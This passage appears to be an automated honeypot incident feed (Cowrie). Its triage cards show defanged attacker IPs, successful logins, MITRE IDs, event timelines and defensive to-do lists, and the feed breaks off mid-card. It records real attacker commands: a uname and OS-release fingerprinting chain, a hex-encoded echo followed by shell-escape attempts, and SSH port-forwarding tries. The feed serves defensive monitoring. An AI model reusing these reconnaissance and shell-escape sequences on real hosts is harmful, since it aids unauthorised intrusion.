
| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:24 |
| **Last Seen** | 2026-07-26 09:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:24:04` | `cowrie.session.connect` |
| `2026-07-26 09:24:05` | `cowrie.client.version` |
| `2026-07-26 09:24:05` | `cowrie.client.kex` |
| `2026-07-26 09:24:09` | `cowrie.login.success` |
| `2026-07-26 09:24:11` | `cowrie.session.params` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.success` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:11` | `cowrie.command.input` |
| `2026-07-26 09:24:13` | `cowrie.log.closed` |
| `2026-07-26 09:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1ceff0332f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:26 |
| **Last Seen** | 2026-07-26 09:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:26:49` | `cowrie.session.connect` |
| `2026-07-26 09:26:49` | `cowrie.client.version` |
| `2026-07-26 09:26:49` | `cowrie.client.kex` |
| `2026-07-26 09:26:54` | `cowrie.login.success` |
| `2026-07-26 09:26:56` | `cowrie.session.params` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.success` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:56` | `cowrie.command.input` |
| `2026-07-26 09:26:58` | `cowrie.log.closed` |
| `2026-07-26 09:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b887cbfbe558

| Field | Detail |
|---|---|
| **Source IP** | `223.223.194[.]187` |
| **First Seen** | 2026-07-26 09:27 |
| **Last Seen** | 2026-07-26 09:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:27:40` | `cowrie.session.connect` |
| `2026-07-26 09:27:41` | `cowrie.client.version` |
| `2026-07-26 09:27:41` | `cowrie.client.kex` |
| `2026-07-26 09:27:43` | `cowrie.login.success` |
| `2026-07-26 09:27:44` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.223.194[.]187` to AbuseIPDB if not already reported
- [ ] Block `223.223.194[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94247ef5b5cb

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-07-26 09:27 |
| **Last Seen** | 2026-07-26 09:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:27:53` | `cowrie.session.connect` |
| `2026-07-26 09:27:54` | `cowrie.client.version` |
| `2026-07-26 09:27:54` | `cowrie.client.kex` |
| `2026-07-26 09:27:56` | `cowrie.login.success` |
| `2026-07-26 09:27:57` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096a305f1d51

| Field | Detail |
|---|---|
| **Source IP** | `41.60.23[.]246` |
| **First Seen** | 2026-07-26 09:28 |
| **Last Seen** | 2026-07-26 09:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:28:19` | `cowrie.session.connect` |
| `2026-07-26 09:28:20` | `cowrie.client.version` |
| `2026-07-26 09:28:20` | `cowrie.client.kex` |
| `2026-07-26 09:28:22` | `cowrie.login.success` |
| `2026-07-26 09:28:22` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.60.23[.]246` to AbuseIPDB if not already reported
- [ ] Block `41.60.23[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eec64238714

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-26 09:28 |
| **Last Seen** | 2026-07-26 09:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:28:28` | `cowrie.session.connect` |
| `2026-07-26 09:28:28` | `cowrie.client.version` |
| `2026-07-26 09:28:28` | `cowrie.client.kex` |
| `2026-07-26 09:28:30` | `cowrie.login.success` |
| `2026-07-26 09:28:30` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb879c73147

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:29 |
| **Last Seen** | 2026-07-26 09:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:29:30` | `cowrie.session.connect` |
| `2026-07-26 09:29:32` | `cowrie.client.version` |
| `2026-07-26 09:29:32` | `cowrie.client.kex` |
| `2026-07-26 09:29:36` | `cowrie.login.success` |
| `2026-07-26 09:29:39` | `cowrie.session.params` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.success` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:39` | `cowrie.command.input` |
| `2026-07-26 09:29:40` | `cowrie.log.closed` |
| `2026-07-26 09:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1146bfa098d3

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-07-26 09:31 |
| **Last Seen** | 2026-07-26 09:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:31:41` | `cowrie.session.connect` |
| `2026-07-26 09:31:42` | `cowrie.client.version` |
| `2026-07-26 09:31:42` | `cowrie.client.kex` |
| `2026-07-26 09:31:45` | `cowrie.login.success` |
| `2026-07-26 09:31:45` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24457df78b9b

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-26 09:31 |
| **Last Seen** | 2026-07-26 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:31:50` | `cowrie.session.connect` |
| `2026-07-26 09:31:51` | `cowrie.client.version` |
| `2026-07-26 09:31:51` | `cowrie.client.kex` |
| `2026-07-26 09:31:52` | `cowrie.login.success` |
| `2026-07-26 09:31:53` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a457a07f04ff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:32 |
| **Last Seen** | 2026-07-26 09:32 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:32:08` | `cowrie.session.connect` |
| `2026-07-26 09:32:09` | `cowrie.client.version` |
| `2026-07-26 09:32:09` | `cowrie.client.kex` |
| `2026-07-26 09:32:13` | `cowrie.login.success` |
| `2026-07-26 09:32:20` | `cowrie.session.params` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.success` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:20` | `cowrie.command.input` |
| `2026-07-26 09:32:22` | `cowrie.log.closed` |
| `2026-07-26 09:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33e4f7de99b

| Field | Detail |
|---|---|
| **Source IP** | `198.98.53[.]110` |
| **First Seen** | 2026-07-26 09:33 |
| **Last Seen** | 2026-07-26 09:33 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system, shell, sh` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:33:00` | `cowrie.session.connect` |
| `2026-07-26 09:33:16` | `cowrie.telnet.option` |
| `2026-07-26 09:33:16` | `cowrie.telnet.option` |
| `2026-07-26 09:33:16` | `cowrie.login.success` |
| `2026-07-26 09:33:17` | `cowrie.session.params` |
| `2026-07-26 09:33:17` | `cowrie.telnet.option` |
| `2026-07-26 09:33:17` | `cowrie.telnet.option` |
| `2026-07-26 09:33:17` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.failed` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.failed` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.failed` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:18` | `cowrie.command.input` |
| `2026-07-26 09:33:24` | `cowrie.log.closed` |
| `2026-07-26 09:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.53[.]110` to AbuseIPDB if not already reported
- [ ] Block `198.98.53[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201ee0a2406a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:34 |
| **Last Seen** | 2026-07-26 09:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:34:37` | `cowrie.session.connect` |
| `2026-07-26 09:34:38` | `cowrie.client.version` |
| `2026-07-26 09:34:38` | `cowrie.client.kex` |
| `2026-07-26 09:34:42` | `cowrie.login.success` |
| `2026-07-26 09:34:45` | `cowrie.session.params` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.success` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:45` | `cowrie.command.input` |
| `2026-07-26 09:34:47` | `cowrie.log.closed` |
| `2026-07-26 09:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45238c10b00d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:01` | `cowrie.session.connect` |
| `2026-07-26 09:37:01` | `cowrie.client.version` |
| `2026-07-26 09:37:01` | `cowrie.client.kex` |
| `2026-07-26 09:37:01` | `cowrie.login.success` |
| `2026-07-26 09:37:02` | `cowrie.session.params` |
| `2026-07-26 09:37:02` | `cowrie.command.input` |
| `2026-07-26 09:37:02` | `cowrie.log.closed` |
| `2026-07-26 09:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa12e21770f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:06` | `cowrie.session.connect` |
| `2026-07-26 09:37:06` | `cowrie.client.version` |
| `2026-07-26 09:37:06` | `cowrie.client.kex` |
| `2026-07-26 09:37:06` | `cowrie.login.success` |
| `2026-07-26 09:37:07` | `cowrie.session.params` |
| `2026-07-26 09:37:07` | `cowrie.command.input` |
| `2026-07-26 09:37:07` | `cowrie.log.closed` |
| `2026-07-26 09:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed22ee93a54c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:11` | `cowrie.session.connect` |
| `2026-07-26 09:37:11` | `cowrie.client.version` |
| `2026-07-26 09:37:11` | `cowrie.client.kex` |
| `2026-07-26 09:37:12` | `cowrie.login.success` |
| `2026-07-26 09:37:13` | `cowrie.session.params` |
| `2026-07-26 09:37:13` | `cowrie.command.input` |
| `2026-07-26 09:37:13` | `cowrie.log.closed` |
| `2026-07-26 09:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578dcc93cc0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:16` | `cowrie.session.connect` |
| `2026-07-26 09:37:16` | `cowrie.client.version` |
| `2026-07-26 09:37:16` | `cowrie.client.kex` |
| `2026-07-26 09:37:16` | `cowrie.login.success` |
| `2026-07-26 09:37:17` | `cowrie.session.params` |
| `2026-07-26 09:37:17` | `cowrie.command.input` |
| `2026-07-26 09:37:17` | `cowrie.log.closed` |
| `2026-07-26 09:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a9781d3483

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:21` | `cowrie.session.connect` |
| `2026-07-26 09:37:21` | `cowrie.client.version` |
| `2026-07-26 09:37:21` | `cowrie.client.kex` |
| `2026-07-26 09:37:21` | `cowrie.login.success` |
| `2026-07-26 09:37:22` | `cowrie.session.params` |
| `2026-07-26 09:37:22` | `cowrie.command.input` |
| `2026-07-26 09:37:22` | `cowrie.log.closed` |
| `2026-07-26 09:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4974f18ed172

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:25` | `cowrie.session.connect` |
| `2026-07-26 09:37:25` | `cowrie.client.version` |
| `2026-07-26 09:37:26` | `cowrie.client.kex` |
| `2026-07-26 09:37:26` | `cowrie.login.success` |
| `2026-07-26 09:37:27` | `cowrie.session.params` |
| `2026-07-26 09:37:27` | `cowrie.command.input` |
| `2026-07-26 09:37:27` | `cowrie.log.closed` |
| `2026-07-26 09:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-611158613186

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:30` | `cowrie.session.connect` |
| `2026-07-26 09:37:30` | `cowrie.client.version` |
| `2026-07-26 09:37:30` | `cowrie.client.kex` |
| `2026-07-26 09:37:31` | `cowrie.login.success` |
| `2026-07-26 09:37:31` | `cowrie.session.params` |
| `2026-07-26 09:37:31` | `cowrie.command.input` |
| `2026-07-26 09:37:32` | `cowrie.log.closed` |
| `2026-07-26 09:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72f9c3208e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
